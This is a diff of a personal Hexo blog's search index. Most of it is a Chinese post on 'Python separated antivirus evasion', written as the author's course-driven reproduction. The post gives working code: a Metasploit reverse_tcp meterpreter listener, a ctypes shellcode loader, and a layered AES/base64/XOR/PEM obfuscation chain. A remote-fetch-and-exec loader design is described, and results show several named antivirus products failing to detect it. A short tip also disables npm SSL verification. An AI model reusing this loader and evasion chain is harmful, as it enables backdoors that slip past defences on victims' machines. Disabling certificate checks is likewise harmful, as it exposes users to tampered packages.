@@ -5,7 +5,8 @@
     <url>/2021/10/01/Welcome/</url>
     <content><![CDATA[<h2 id="搭建博客"><a href="#搭建博客" class="headerlink" title="搭建博客"></a>搭建博客</h2><p>环境搭建——–&gt;<a href="https://blog.csdn.net/weixin_45019350/article/details/121901433">Hexo-零基础搭建个人博客(详解)_hexo博客-CSDN博客</a></p>
 <p>主题安装——–&gt;<a href="https://butterfly.js.org/">Butterfly - A Simple and Card UI Design theme for Hexo</a></p>
-<h2 id="撰写博客"><a href="#撰写博客" class="headerlink" title="撰写博客"></a>撰写博客</h2><p>参照————–&gt;<a href="https://butterfly.js.org/posts/dc584b87/">Butterfly 文檔(二) 主題頁面 | Butterfly</a></p>
+<h2 id="撰写博客"><a href="#撰写博客" class="headerlink" title="撰写博客"></a>撰写博客</h2><p>文章Front-matter参照——–&gt;<a href="https://butterfly.js.org/posts/dc584b87/">Butterfly 文檔(二) 主題頁面 | Butterfly</a></p>
+<p>图片安置参照——–&gt;<a href="https://blog.csdn.net/m0_43401436/article/details/107191688">https://blog.csdn.net/m0_43401436/article/details/107191688</a></p>
 <h2 id="Bug"><a href="#Bug" class="headerlink" title="Bug"></a>Bug</h2><p>当博客出现npm下载出现如下报错<code>unable to verify the first certificate</code>或者使用npm下载东西无进度时</p>
 <p>取消ssl验证</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm config set strict-ssl false</span><br></pre></td></tr></table></figure>
@@ -15,7 +16,8 @@
   <entry>
     <title>python分离免杀</title>
     <url>/2023/02/09/python%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/</url>
-    <content><![CDATA[<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><table>
+    <content><![CDATA[<p>通过课程逐步了解了下免杀技术，由于课程需要和自身的探索欲，想着整一下试试，本篇是参照网上分离免杀例子进行复现，使用混淆加密方式结合shellcode与shellcodeloader分离式免杀</p>
+<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><table>
 <thead>
 <tr>
 <th>对象</th>
@@ -53,7 +55,7 @@
 <p>kali（192.168.125.29）开启监听</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler/</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">set lhost 0.0.0.0</span><br><span class="line">set lport 8888</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
 
-<p><img src="/image-20240613161650234-17390843917341.png" alt="image-20240613161650234"></p>
+<p><img src="/2023/02/09/python%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/image-20240613161650234-17390843917341.png" alt="image-20240613161650234"></p>
 <h2 id="技术支持"><a href="#技术支持" class="headerlink" title="技术支持"></a>技术支持</h2><h3 id="分离技术"><a href="#分离技术" class="headerlink" title="分离技术"></a>分离技术</h3><p>将ShellCode和加载器代码放置于网络&#x2F;服务器上，可以是二进制文件、文本文件、jpg等文件，通过请求读取的方式进行加载</p>
 <p>实际测试用例中，主要思想是将经加密、编码后的shellcode放入服务器一中，将加密、编码后的shellcodeloader放入服务器二中，使用python中的request方法请求服务器的url，获取相应的shellcode和shellcodeloader，最终使用exec函数执行加载器</p>
 <p>在如下代码中，a.text表示shellcode，b.content表示shellcodeloader，shellcodeloader中包含了解密所需方法、所需库，buf（shellcode）最终被带入b.content中进行解密、执行</p>
@@ -79,7 +81,7 @@
 </ul>
 <p>原理就是首先将明文进行分组，128位为一组，然后使用密钥结合AES算法对分组后的明文进行加密</p>
 <p>CBC模式图：</p>
-<p><img src="/image-20240613170450982-17390843917342.png" alt="image-20240613170450982"></p>
+<p><img src="/2023/02/09/python%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/image-20240613170450982-17390843917342.png" alt="image-20240613170450982"></p>
 <p>python为AES代码实现提供了一种很方便的库，我们可以引用相关库实现AES加密</p>
 <p>考虑到明文有时候不够128位，所以使用pad来进行填充，unpad就是去除填充</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Cipher import AES</span><br><span class="line">from Crypto.Util.Padding import pad, unpad</span><br><span class="line"></span><br><span class="line">def aes_encode(shellcode):</span><br><span class="line">    a = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    # 填充明文，加密的数据必须被128整除</span><br><span class="line">    b = a.encrypt(pad(shellcode, 32))</span><br><span class="line">    # byte转16</span><br><span class="line">    return binascii.b2a_hex(b)</span><br></pre></td></tr></table></figure>
@@ -121,18 +123,18 @@
 
 <p>也可以使用CS生成payload后门</p>
 <p>kali开启CS服务端</p>
-<p><img src="/image-20240614093033227-17390843917354.png" alt="image-20240614093033227"></p>
+<p><img src="/2023/02/09/python%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/image-20240614093033227-17390843917354.png" alt="image-20240614093033227"></p>
 <p>主机打开CS客户端连接服务端</p>
-<p><img src="/image-20240614093120525-17390843917353.png" alt="image-20240614093120525"></p>
+<p><img src="/2023/02/09/python%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/image-20240614093120525-17390843917353.png" alt="image-20240614093120525"></p>
 <p>在攻击–&gt;生成后门–&gt;payload生成器中</p>
-<p><img src="/image-20240614093141355-17390843917355.png" alt="image-20240614093141355"></p>
-<p><img src="/image-20240614093302735-17390843917356.png" alt="image-20240614093302735"></p>
+<p><img src="/2023/02/09/python%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/image-20240614093141355-17390843917355.png" alt="image-20240614093141355"></p>
+<p><img src="/2023/02/09/python%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/image-20240614093302735-17390843917356.png" alt="image-20240614093302735"></p>
 <h2 id="测试阶段"><a href="#测试阶段" class="headerlink" title="测试阶段"></a>测试阶段</h2><h3 id="不应用任何免杀技术"><a href="#不应用任何免杀技术" class="headerlink" title="不应用任何免杀技术"></a>不应用任何免杀技术</h3><p>使用shellcode加载器分配内存执行shellcode，可以正常上线</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">import ctypes</span><br><span class="line"></span><br><span class="line"># shellcode</span><br><span class="line">buf =  b&quot;&quot;</span><br><span class="line">shellcode = bytearray(buf)</span><br><span class="line"></span><br><span class="line"># 设置VirtualAlloc返回类型为ctypes.c_uint64</span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span><br><span class="line"># 申请内存</span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000),</span><br><span class="line">                                          ctypes.c_int(0x40))</span><br><span class="line"># 放入shellcode</span><br><span class="line">buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(ptr), buf, ctypes.c_int(len(shellcode)))</span><br><span class="line"># 创建一个线程从shellcode放置位置首地址开始执行</span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0), ctypes.c_int(0), ctypes.c_uint64(ptr), ctypes.c_int(0),</span><br><span class="line">                                             ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))</span><br><span class="line"># 等待上面创建的线程运行完</span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-1))</span><br></pre></td></tr></table></figure>
 
-<p><img src="/image-20240613161730129-17390843917358.png" alt="image-20240613161730129"></p>
+<p><img src="/2023/02/09/python%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/image-20240613161730129-17390843917358.png" alt="image-20240613161730129"></p>
 <p>无论是py文件还是打包成exe，就会马上被安全软件检测出来，根据提示被发现是后门木马</p>
-<p><img src="/image-20240613162146020-17390843917357.png" alt="image-20240613162146020"></p>
+<p><img src="/2023/02/09/python%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/image-20240613162146020-17390843917357.png" alt="image-20240613162146020"></p>
 <h3 id="shellcode加密混淆"><a href="#shellcode加密混淆" class="headerlink" title="shellcode加密混淆"></a>shellcode加密混淆</h3><p>结合上述提示，说明杀毒软件检测出来了shellcode，爆出了后门木马</p>
 <p>那么可以将shellcode进行加密编码混淆，使得检出率降低</p>
 <p>将shellcode进行byte转str–&gt;base64编码–&gt;AES加密，后依旧爆出后门木马</p>
@@ -145,7 +147,7 @@
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import base64</span><br><span class="line">import binascii</span><br><span class="line">import ctypes</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">from Crypto.Util.Padding import pad, unpad</span><br><span class="line">from Crypto.IO import PEM</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = b&#x27;4d65017f65d72aada5d1ab08d5c4bd18&#x27;</span><br><span class="line">iv = b&#x27;7d2d3e0bb1642d52&#x27;</span><br><span class="line"></span><br><span class="line">def aes_decode(shellcode):</span><br><span class="line">    a = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    shellcode = binascii.a2b_hex(shellcode)</span><br><span class="line">    shellcode = unpad(a.decrypt(shellcode), 32)</span><br><span class="line">    return shellcode</span><br><span class="line"></span><br><span class="line">def a_to_b(shellcode):</span><br><span class="line">    return binascii.a2b_hex(shellcode)</span><br><span class="line"></span><br><span class="line">def b64decode(shellcode):</span><br><span class="line">    return base64.b64decode(shellcode)</span><br><span class="line"></span><br><span class="line">def PEM_decode(shellcode):</span><br><span class="line">    shellcode = PEM.decode(shellcode, passphrase=b&#x27;shellcode&#x27;)</span><br><span class="line">    return shellcode</span><br><span class="line"></span><br><span class="line">def shellcode_xor_decode(shellcode):</span><br><span class="line">    shellcode = shellcode.split(&#x27;_&#x27;)</span><br><span class="line">    xor_code = &#x27;&#x27;</span><br><span class="line">    for i in shellcode:</span><br><span class="line">        i = int(i) ^ 678</span><br><span class="line">        xor_code += chr(i)</span><br><span class="line">    return xor_code</span><br><span class="line"></span><br><span class="line">def main(shellcode):</span><br><span class="line">    return a_to_b(b64decode(aes_decode(PEM_decode(shellcode_xor_decode(shellcode))[0])))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 存放加密后的shellcode</span><br><span class="line">buf = &#x27;&#x27;</span><br><span class="line">buf = main(buf)</span><br><span class="line">shellcode = bytearray(buf)</span><br><span class="line"># 设置VirtualAlloc返回类型为ctypes.c_uint64</span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span><br><span class="line"># 申请内存</span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000),</span><br><span class="line">                                          ctypes.c_int(0x40))</span><br><span class="line"># 放入shellcode</span><br><span class="line">buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(ptr), buf, ctypes.c_int(len(shellcode)))</span><br><span class="line"># 创建一个线程从shellcode放置位置首地址开始执行</span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0), ctypes.c_int(0), ctypes.c_uint64(ptr),</span><br><span class="line">                                             ctypes.c_int(0),</span><br><span class="line">                                             ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))</span><br><span class="line"># 等待上面创建的线程运行完</span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-1))</span><br></pre></td></tr></table></figure>
 
 <p>这次使用安全软件检测，发现检出问题相对于不加任何免杀技术报警发生了变化，这次是爆出关于python的shellloader</p>
-<p><img src="/image-20240613201620740-17390843917359.png" alt="image-20240613201620740"></p>
+<p><img src="/2023/02/09/python%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/image-20240613201620740-17390843917359.png" alt="image-20240613201620740"></p>
 <h3 id="shellcodeloader编码"><a href="#shellcodeloader编码" class="headerlink" title="shellcodeloader编码"></a>shellcodeloader编码</h3><p>根据上述爆出的错误，说明防病毒软件检出了shellcodeloader</p>
 <p>那么下一步就是需要针对shellcodeloader做处理，降低检出率</p>
 <p>思路：将shellcodeloader使用切片的方式，对shellcodeloader进行反转（python切片，从右到左），然后进行base64编码</p>
@@ -166,44 +168,44 @@
 
 <p>使用防病毒软件测试，此时，针对于执行shellcode的py文件防病毒软件已经不会报警了</p>
 <h4 id="py文件测试"><a href="#py文件测试" class="headerlink" title="py文件测试"></a>py文件测试</h4><p>火绒</p>
-<p><img src="/image-20240613203111150-173908439173510.png" alt="image-20240613203111150"></p>
+<p><img src="/2023/02/09/python%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/image-20240613203111150-173908439173510.png" alt="image-20240613203111150"></p>
 <p>windows Defender</p>
-<p><img src="/image-20240613205912101-173908439173511.png" alt="image-20240613205912101"></p>
+<p><img src="/2023/02/09/python%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/image-20240613205912101-173908439173511.png" alt="image-20240613205912101"></p>
 <p>360</p>
-<p><img src="/image-20240613212151292-173908439173512.png" alt="image-20240613212151292"></p>
+<p><img src="/2023/02/09/python%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/image-20240613212151292-173908439173512.png" alt="image-20240613212151292"></p>
 <p>腾讯电脑管家</p>
-<p><img src="/image-20240613212213677-173908439173513.png" alt="image-20240613212213677"></p>
+<p><img src="/2023/02/09/python%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/image-20240613212213677-173908439173513.png" alt="image-20240613212213677"></p>
 <p>VIRUSTOTAL：<code>https://www.virustotal.com/gui/home/upload</code></p>
-<p><img src="/image-20240613210054943-173908439173514.png" alt="image-20240613210054943"></p>
+<p><img src="/2023/02/09/python%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/image-20240613210054943-173908439173514.png" alt="image-20240613210054943"></p>
 <p>微步在线：<code>https://s.threatbook.com/</code></p>
-<p><img src="/image-20240613210045834-173908439173515.png" alt="image-20240613210045834"></p>
+<p><img src="/2023/02/09/python%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/image-20240613210045834-173908439173515.png" alt="image-20240613210045834"></p>
 <h6 id="上线测试"><a href="#上线测试" class="headerlink" title="上线测试"></a>上线测试</h6><p>运行py文件</p>
-<p><img src="/image-20240613215659882-173908439173516.png" alt="image-20240613215659882"></p>
+<p><img src="/2023/02/09/python%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/image-20240613215659882-173908439173516.png" alt="image-20240613215659882"></p>
 <p>上线成功</p>
-<p><img src="/image-20240613215722459-173908439173518.png" alt="image-20240613215722459"></p>
+<p><img src="/2023/02/09/python%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/image-20240613215722459-173908439173518.png" alt="image-20240613215722459"></p>
 <h4 id="exe文件测试"><a href="#exe文件测试" class="headerlink" title="exe文件测试"></a>exe文件测试</h4><p>将其打包成exe就会报警，即使采用了不加-w参数</p>
 <p>火绒检测</p>
-<p><img src="/image-20240613204415840-173908439173517.png" alt="image-20240613204415840"></p>
+<p><img src="/2023/02/09/python%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/image-20240613204415840-173908439173517.png" alt="image-20240613204415840"></p>
 <p>windows Defender</p>
 <p>加上-w参数能够扫描到，不加上-w参数扫描不到</p>
-<p><img src="/image-20240613205443924-173908439173522.png" alt="image-20240613205443924"></p>
+<p><img src="/2023/02/09/python%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/image-20240613205443924-173908439173522.png" alt="image-20240613205443924"></p>
 <p>360</p>
 <p>加不加-w参数均会报警</p>
-<p><img src="/image-20240613212352370-173908439173519.png" alt="image-20240613212352370"></p>
+<p><img src="/2023/02/09/python%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/image-20240613212352370-173908439173519.png" alt="image-20240613212352370"></p>
 <p>腾讯电脑管家</p>
 <p>加不加-w参数均不会报警</p>
-<p><img src="/image-20240613212321050-173908439173520.png" alt="image-20240613212321050"></p>
+<p><img src="/2023/02/09/python%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/image-20240613212321050-173908439173520.png" alt="image-20240613212321050"></p>
 <p>VIRUSTOTAL：<code>https://www.virustotal.com/gui/home/upload</code></p>
 <p>加-w参数检出19个</p>
-<p><img src="/image-20240613204520455-173908439173521.png" alt="image-20240613204520455"></p>
+<p><img src="/2023/02/09/python%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/image-20240613204520455-173908439173521.png" alt="image-20240613204520455"></p>
 <p>不加-w参数检出13个</p>
-<p><img src="/image-20240613205144509-173908439173523.png" alt="image-20240613205144509"></p>
+<p><img src="/2023/02/09/python%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/image-20240613205144509-173908439173523.png" alt="image-20240613205144509"></p>
 <p>微步在线：<code>https://s.threatbook.com/</code></p>
 <p>加-w参数检出5个</p>
-<p><img src="/image-20240613204711772-173908439173524.png" alt="image-20240613204711772"></p>
+<p><img src="/2023/02/09/python%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/image-20240613204711772-173908439173524.png" alt="image-20240613204711772"></p>
 <p>不加-w参数检出3个</p>
-<p><img src="/image-20240613205125202-173908439173525.png" alt="image-20240613205125202"></p>
-<h5 id="上线测试-1"><a href="#上线测试-1" class="headerlink" title="上线测试"></a>上线测试</h5><p><img src="/image-20240613215914043-173908439173527.png" alt="image-20240613215914043"></p>
+<p><img src="/2023/02/09/python%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/image-20240613205125202-173908439173525.png" alt="image-20240613205125202"></p>
+<h5 id="上线测试-1"><a href="#上线测试-1" class="headerlink" title="上线测试"></a>上线测试</h5><p><img src="/2023/02/09/python%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/image-20240613215914043-173908439173527.png" alt="image-20240613215914043"></p>
 <h3 id="shellcode和shellcodeloader分离"><a href="#shellcode和shellcodeloader分离" class="headerlink" title="shellcode和shellcodeloader分离"></a>shellcode和shellcodeloader分离</h3><p>上述的py的检出率基本为0，但是打包成exe后检出率惨不忍睹，使用分离免杀技术针对此问题进行解决</p>
 <p>思路：将加密后的shellcode和shellcodeloader上传到服务器上，通过request请求url方式获取shellcode和shellcodeloader内容，然后使用exec函数运行shellcodeloader</p>
 <p>因为上述设计的解密脚本集解密、分配内存为一体，所以我们定义一个变量将解密脚本整个文件内容进行加密</p>
@@ -221,28 +223,30 @@
 
 <h4 id="防病毒软件测试"><a href="#防病毒软件测试" class="headerlink" title="防病毒软件测试"></a>防病毒软件测试</h4><p>windows Defender</p>
 <p>加不加-w参数均扫不到</p>
-<p><img src="/image-20240613212651442-173908439173526.png" alt="image-20240613212651442"></p>
+<p><img src="/2023/02/09/python%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/image-20240613212651442-173908439173526.png" alt="image-20240613212651442"></p>
 <p>火绒</p>
 <p>加不加-w参数均扫不到</p>
-<p><img src="/image-20240613212749349-173908439173528.png" alt="image-20240613212749349"></p>
+<p><img src="/2023/02/09/python%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/image-20240613212749349-173908439173528.png" alt="image-20240613212749349"></p>
 <p>360</p>
 <p>加-w参数被扫描到，不加-w参数不会被扫描到</p>
-<p><img src="/image-20240613214905976-173908439173530.png" alt="image-20240613214905976"></p>
+<p><img src="/2023/02/09/python%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/image-20240613214905976-173908439173530.png" alt="image-20240613214905976"></p>
 <p>腾讯电脑管家</p>
 <p>加不加-w参数均扫不到</p>
-<p><img src="/image-20240613212920626-173908439173529.png" alt="image-20240613212920626"></p>
+<p><img src="/2023/02/09/python%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/image-20240613212920626-173908439173529.png" alt="image-20240613212920626"></p>
 <p>VIRUSTOTAL：<code>https://www.virustotal.com/gui/home/upload</code></p>
 <p>加上-w参数检出率16个</p>
-<p><img src="/image-20240613215026944-173908439173631.png" alt="image-20240613215026944"></p>
+<p><img src="/2023/02/09/python%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/image-20240613215026944-173908439173631.png" alt="image-20240613215026944"></p>
 <p>不加-w参数检出率为12</p>
-<p><img src="/image-20240613215228145-173908439173632.png" alt="image-20240613215228145"></p>
+<p><img src="/2023/02/09/python%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/image-20240613215228145-173908439173632.png" alt="image-20240613215228145"></p>
 <p>微步在线：<code>https://s.threatbook.com/</code></p>
 <p>加-w参数检出率4个，评估恶意</p>
-<p><img src="/image-20240613215118582-173908439173634.png" alt="image-20240613215118582"></p>
+<p><img src="/2023/02/09/python%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/image-20240613215118582-173908439173634.png" alt="image-20240613215118582"></p>
 <p>不加-w参数检出率2，评估恶意</p>
-<p><img src="/image-20240613215522323-173908439173633.png" alt="image-20240613215522323"></p>
+<p><img src="/2023/02/09/python%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/image-20240613215522323-173908439173633.png" alt="image-20240613215522323"></p>
 <h4 id="上线测试-2"><a href="#上线测试-2" class="headerlink" title="上线测试"></a>上线测试</h4><p>运行exe文件，均可上线kali（攻击机）</p>
-<p><img src="/image-20240613214952975-173908439173635.png" alt="image-20240613214952975"></p>
+<p><img src="/2023/02/09/python%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/image-20240613214952975-173908439173635.png" alt="image-20240613214952975"></p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://blog.csdn.net/qq_43884092/article/details/133800756">python加载shellcode免杀_python shellcode加载器-CSDN博客</a></p>
+<p><a href="https://cn-sec.com/archives/986777.html">Python分离免杀 | CN-SEC 中文网</a></p>
 ]]></content>
       <categories>
         <category>免杀</category>
